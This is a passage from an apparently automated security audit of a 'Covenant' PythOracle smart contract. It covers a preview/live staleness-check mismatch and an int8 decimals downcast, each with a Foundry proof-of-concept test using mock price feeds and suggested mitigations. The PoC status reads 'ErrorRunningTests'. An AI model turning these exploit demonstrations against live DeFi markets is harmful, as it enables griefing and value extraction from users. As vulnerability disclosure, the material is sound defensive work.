  - Then call fullMulDiv with the reduced terms to guarantee no intermediate 256-bit overflow:
    - Non-inverse: return fullMulDiv(inAmount, priceScale * unitPrice, feedScale) after cancellations.
    - Inverse: return fullMulDiv(inAmount, feedScale, priceScale * unitPrice) after cancellations.
  - Alternatively, implement a dedicated mulDiv3(a, b, c, d) that computes (a*b*c)/d using 512-bit intermediates and GCD-based reductions so no intermediate 256-bit multiply is required.
  - As a simpler fix for common configurations where feedScale % priceScale == 0, rewrite as non-inverse: return fullMulDiv(inAmount, unitPrice, feedScale / priceScale) and inverse: return fullMulDiv(inAmount, feedScale / priceScale, unitPrice). Fallback to the GCD/cancellation path when not divisible.





 **Derived From** : If previewGetQuote(inAmount, base, quote) succeeds then (block.timestamp - IPyth(pyth).getPriceUnsafe(feedId).publishTime) <= maxStaleness

## [M-12]. previewGetQuote accepts stale Pyth prices up to global upper bound, while live getQuote reverts at per-instance maxStaleness causing preview↔live mismatch and DoS

## Derived From Pattern/Invariant
If previewGetQuote(inAmount, base, quote) succeeds then (block.timestamp - IPyth(pyth).getPriceUnsafe(feedId).publishTime) <= maxStaleness

## Exploit Type
TimestampDependentLogic

## Location
PythOracle.previewGetQuote

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The Covenant PythOracle preview path relaxes the staleness check by using the global MAX_STALENESS_UPPER_BOUND (15 minutes) instead of the feed’s configured maxStaleness. In _previewFetchPriceStruct():

if (staleness > MAX_STALENESS_UPPER_BOUND) revert Errors.PriceOracle_InvalidAnswer();

but live _fetchPriceStruct() correctly checks:

if (staleness > maxStaleness) revert Errors.PriceOracle_InvalidAnswer();

This temporal inconsistency lets previewGetQuote() return a price for feeds where staleness ∈ (maxStaleness, MAX_STALENESS_UPPER_BOUND], but a subsequent getQuote() (used in execution) reverts. Attackers can grief users and higher-level flows (e.g., routers/aggregators that rely on preview for setting minOut or for quoting) by timing calls when staleness is slightly over maxStaleness, causing transactions to revert and breaking availability. This is a temporal invariant violation: time-dependent staleness logic is inconsistent between preview and live execution.

## Impact
Functional DoS and broken preview↔execution consistency: users see an executable quote that will always revert at execution until a Pyth update is pushed; routers or frontends depending on preview can craft transactions that revert, wasting gas and disrupting market activity.

## Command to Run Test


## Proof of Concept
1) Deploy PythOracle with maxStaleness = 60 seconds and a valid Pyth feed.
2) Mock Pyth to return a price with publishTime = block.timestamp - 61 seconds (and otherwise valid conf/expo/price), so staleness = 61s.
3) Call previewGetQuote(...): it succeeds because 61s <= MAX_STALENESS_UPPER_BOUND (15m).
4) Call getQuote(...): it reverts because 61s > maxStaleness (60s).
5) An attacker times submissions during this window to cause repeated reverts for users/routers who rely on preview to set expectations, effectively creating a denial of service and breaking UX/assumptions.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {PythOracle as CovenantPythOracle} from "src/curators/oracles/pyth/PythOracle.sol";
import {PythStructs} from "@pyth/PythStructs.sol";

contract MockERC20Decimals {
    function decimals() external pure returns (uint8) { return 18; }
}

contract MockPyth {
    PythStructs.Price internal p;

    function setPrice(int64 price, uint64 conf, int32 expo, uint64 publishTime) external {
        p.price = price;
        p.conf = conf;
        p.expo = expo;
        p.publishTime = publishTime;
    }

    function getPriceUnsafe(bytes32) external view returns (PythStructs.Price memory) { return p; }
    function updatePriceFeeds(bytes[] calldata) external payable {}
    function getUpdateFee(bytes[] calldata) external pure returns (uint256) { return 0; }
}

contract PythTemporalInvariantTest is Test {
    CovenantPythOracle oracle;
    MockPyth pyth;
    MockERC20Decimals base;
    MockERC20Decimals quote;

    function setUp() public {
        base = new MockERC20Decimals();
        quote = new MockERC20Decimals();
        pyth = new MockPyth();
        // maxStaleness = 60s, maxConfWidth = 100 bps
        oracle = new CovenantPythOracle(
            address(pyth),
            address(base),
            address(quote),
            bytes32("FEED"),
            60,
            100
        );
    }

    function test_preview_allows_stale_but_live_reverts() public {
        vm.warp(1_000_000);
        // price valid but stale by 61s (> maxStaleness=60s, <= MAX_STALENESS_UPPER_BOUND=15m)
        pyth.setPrice(int64(1_000_000_000), uint64(1), int32(-8), uint64(block.timestamp - 61));

        uint256 outPreview = oracle.previewGetQuote(1e18, address(base), address(quote));
        assertGt(outPreview, 0);

        vm.expectRevert();
        oracle.getQuote(1e18, address(base), address(quote));
    }
}


## Suggested Mitigation
Make preview path apply the same staleness gate as live execution: replace MAX_STALENESS_UPPER_BOUND with maxStaleness in _previewFetchPriceStruct(), or simply reuse the live _fetchPriceStruct() for preview to guarantee temporal consistency. Example: use if (staleness > maxStaleness) revert; in _previewFetchPriceStruct().





 **Derived From** : baseDecimals <= 127 && quoteDecimals <= 127

## [M-13]. int8 downcast of baseDecimals wraps negative for tokens with decimals >127, corrupting Pyth scale and enabling severe mispricing/DoS

## Derived From Pattern/Invariant
baseDecimals <= 127 && quoteDecimals <= 127

## Exploit Type
IntegerOverflow

## Location
PythOracle.previewGetQuote

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
In PythOracle._previewGetQuote (and inherited _getQuote), the adapter computes the feed exponent via int8 feedExponent = int8(baseDecimals) - int8(priceStruct.expo). If base.decimals() > 127 (still valid ERC‑20), casting uint8 baseDecimals to int8 wraps to a negative number. For typical Pyth exponents (e.g. expo = -8), feedExponent becomes large negative instead of the intended large positive (e.g., baseDecimals=200 -> int8(200)=-56 -> feedExponent=-48 instead of +208). This drives the Scale construction down the wrong branch: ScaleUtils.from(quoteDecimals + uint8(-feedExponent), 0) rather than ScaleUtils.from(quoteDecimals, uint8(feedExponent)), producing either astronomically inflated quotes (multiplication by 10^(quoteDecimals+|feedExponent|)) or reverts/overflow behavior inside ScaleUtils/calcOutAmount. As a result, any market using such a token will return grossly incorrect prices or be unusable. Attackers can extract value by trading against the mispriced LatentSwap curve that relies on these quotes, or the market can be bricked (DoS) if the math reverts.

## Impact
Only markets configured with tokens having decimals > 127 are affected, but this is still ERC-20 compliant. For such markets, the downcasted int8 causes the scale exponent to flip sign and magnitude, leading to either gross mispricing (attackers can extract value when minting/swapping/redeeming) or a revert in scaling math (market-specific DoS). Likelihood is lower due to unusual decimals, but impact is high for affected markets.

## Command to Run Test


## Proof of Concept
Concrete example: base.decimals() = 200, quote.decimals() = 18, Pyth price $1 with expo = -8. The code computes feedExponent = int8(baseDecimals) - int8(expo). Here int8(200) = -56, int8(-8) = -8, so feedExponent = -56 - (-8) = -48. The branch for feedExponent <= 0 is selected and ScaleUtils.from(quoteDecimals + uint8(-feedExponent), 0) = ScaleUtils.from(18 + 48, 0) = ScaleUtils.from(66, 0) is used. Correct math (without the int8 wrap) should have used feedExp = 200 - (-8) = 208 and thus ScaleUtils.from(18, 208). This flips the intended decimal adjustment from dividing by 10^(208) into multiplying by 10^(66), leading to astronomically inflated quotes (or an overflow/revert within ScaleUtils/calcOutAmount). Any mint/swap/redeem path that consumes this price can be abused to extract value or becomes unusable due to reverts.

## Proof of Code
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {PythOracle as CovenantPythOracle} from "src/curators/oracles/pyth/PythOracle.sol";
import {PythStructs} from "@pyth/PythStructs.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract CrazyDecimalsToken is ERC20 {
    uint8 private _d;
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) { _d = d; _mint(msg.sender, 1e60); }
    function decimals() public view override returns (uint8) { return _d; }
}

contract MockPyth {
    PythStructs.Price public price;
    function setPrice(int64 p, uint64 conf, int32 expo, int64 ts) external {
        price = PythStructs.Price({price: p, conf: conf, expo: expo, publishTime: ts});
    }
    function getPriceUnsafe(bytes32) external view returns (PythStructs.Price memory) { return price; }
    function getUpdateFee(bytes[] memory) external pure returns (uint) { return 0; }
    function updatePriceFeeds(bytes[] calldata) external payable {}
}

contract PythOracle_Int8Wrap_Test is Test {
    MockPyth mp;
    bytes32 FEED = bytes32("FEED");

    function setUp() public {
        mp = new MockPyth();
        // $1.00, expo = -8, fresh timestamp
        mp.setPrice(100_000_000, 1, -8, int64(block.timestamp));
    }

    function test_Int8CastWrap_MispricingOrDoS() public {
        // Base with decimals > 127 (wraps when cast to int8)
        CrazyDecimalsToken baseHuge = new CrazyDecimalsToken("BASE", "B", 200);
        CrazyDecimalsToken quote = new CrazyDecimalsToken("QUOTE", "Q", 18);
        CovenantPythOracle bad = new CovenantPythOracle(address(mp), address(baseHuge), address(quote), FEED, 60, 10);

        // Baseline with normal 18-decimal base
        CrazyDecimalsToken baseNormal = new CrazyDecimalsToken("B2", "B2", 18);
        CovenantPythOracle ref = new CovenantPythOracle(address(mp), address(baseNormal), address(quote), FEED, 60, 10);

        uint256 inAmt = 1e18; // sufficiently large, but safe for baseline
        uint256 baseline = ref.previewGetQuote(inAmt, address(baseNormal), address(quote));
        assertGt(baseline, 0); // sanity: baseline should produce a positive quote

        // Call buggy oracle with high-decimals base
        (bool ok, bytes memory ret) = address(bad).staticcall(
            abi.encodeWithSelector(bad.previewGetQuote.selector, inAmt, address(baseHuge), address(quote))
        );

        if (!ok) {
            // Demonstrates configuration-specific DoS due to overflow/range checks inside Scale math
            assertTrue(true);
            return;
        }

        uint256 outWrong = abi.decode(ret, (uint256));
        // Wrong sign on feedExponent multiplies instead of divides by huge power of ten
        // Assert severe skew vs baseline (conservative threshold)
        assertGt(outWrong, baseline * 1e18);
    }
}


## Suggested Mitigation
Avoid int8 downcasts when combining uint8 token decimals with signed price exponents. Compute in a wide signed type and range-check both branches before casting:

- Compute feedExp in int256 without narrowing: int256 feedExp = int256(uint256(baseDecimals)) - int256(priceStruct.expo);
- If feedExp >= 0: require(uint256(feedExp) <= type(uint8).max, "exponent too large"); scale = ScaleUtils.from(quoteDecimals, uint8(uint256(feedExp)));
- Else: uint256 m = uint256(-feedExp); require(uint256(quoteDecimals) + m <= type(uint8).max, "exponent too large"); scale = ScaleUtils.from(uint8(uint256(quoteDecimals) + m), 0);

Optionally, enforce constructor-time constraints and document them (e.g., require(baseDecimals <= 127) if ScaleUtils limits require it), but do not blanket-reject negative feedExp since valid Pyth exponents can legitimately produce negative results.



